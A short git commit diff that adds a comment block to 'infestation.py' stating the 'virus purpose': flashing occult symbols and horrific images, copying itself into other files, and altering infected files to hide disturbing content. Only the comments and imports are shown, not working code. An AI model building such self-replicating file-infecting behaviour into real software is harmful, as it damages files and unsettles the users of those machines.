2e3c11c9560fa39f2be3a507e1b18367b4427986
Dorian Delorme <doriandelorme@outlook.fr>
2023-02-20 12:11:42 +0100

    added virus purpose

--- infestation.py
+++ infestation.py
@@ -1,3 +1,13 @@
+# the purpose of the program is :
+    # 1. at runtime, starts to display more and more occult symbols as time goes by, 
+        # which disappear almost immediately after their appearance.
+    # 2. replicates itself in files: with each infected file (thus with each replication), a horrific image is displayed, 
+        # then disappears almost immediately. 
+        # So as time goes by, more and more horrific images will be displayed, faster and more often.
+    # 3. modifies infected files to hide occult symbols, horrific images, and creepy sentences.
+
+
+
 import os
 import shutil
 from PIL import Image
